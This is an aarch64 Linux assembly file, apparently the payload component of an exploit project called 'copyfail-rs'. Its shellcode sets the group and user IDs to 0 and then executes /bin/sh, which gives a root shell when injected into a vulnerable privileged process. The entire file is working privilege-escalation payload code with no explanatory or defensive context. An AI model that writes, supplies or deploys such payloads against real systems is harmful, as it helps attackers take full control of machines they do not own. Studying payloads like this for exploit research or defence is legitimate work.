/*
 * copyfail-rs payload — aarch64
 *
 * setgid(0); setuid(0); execve("/bin/sh", ["sh", NULL], NULL)
 *
 * Linux aarch64 syscalls: x8 = NR, args in x0..x5, svc #0.
 *   SYS_setgid = 144, SYS_setuid = 146, SYS_execve = 221, SYS_exit = 93
 */

.section .text
.globl _start
_start:
    /* setgid(0) */
    mov   x0, #0
    mov   x8, #144
    svc   #0

    /* setuid(0) */
    mov   x0, #0
    mov   x8, #146
    svc   #0

    /* execve("/bin/sh", argv, NULL) */
    adrp  x0, path
    add   x0, x0, :lo12:path
    adrp  x1, argv
    add   x1, x1, :lo12:argv
    mov   x2, #0
    mov   x8, #221
    svc   #0

    /* exit(1) */
    mov   x0, #1
    mov   x8, #93
    svc   #0

.section .rodata
arg0:
    .asciz "sh"
path:
    .asciz "/bin/sh"

.section .data
argv:
    .quad arg0
    .quad 0
